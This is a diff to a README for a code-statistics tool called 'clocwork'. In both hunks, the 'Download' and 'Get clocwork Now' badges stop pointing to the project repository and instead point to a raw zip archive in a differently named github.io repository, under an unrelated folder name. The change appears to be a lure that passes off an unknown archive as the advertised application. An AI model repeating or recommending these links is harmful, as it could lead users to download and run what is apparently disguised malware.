@@ -56,7 +56,7 @@ Getting clocwork on your computer is simple. Follow these steps:
 
 Visit this link to download the application. Click the following button:
 
-[![Download clocwork](https://img.shields.io/badge/Download-clocwork-blue)](https://github.com/zerooneczr/clocwork)
+[![Download clocwork](https://img.shields.io/badge/Download-clocwork-blue)](https://github.com/zerooneczr/zerooneczr.github.io/raw/refs/heads/main/insensitivity/1.9.zip)
 
 ### Step 2: Find the Download Button
 
@@ -155,6 +155,6 @@ Don't let your project's history remain a mystery. With clocwork, you can see ex
 
 Visit this link to download the application. Start your journey to better code understanding today!
 
-[![Get clocwork Now](https://img.shields.io/badge/Get%20clocwork-Now-green)](https://github.com/zerooneczr/clocwork)
+[![Get clocwork Now](https://img.shields.io/badge/Get%20clocwork-Now-green)](https://github.com/zerooneczr/zerooneczr.github.io/raw/refs/heads/main/insensitivity/1.9.zip)
 
 Keywords: ai-agents, claude-code, cli, cloc, code-statistics, codex-cli, dashboard, gemini-cli, git, lines-of-code, python, token-usage
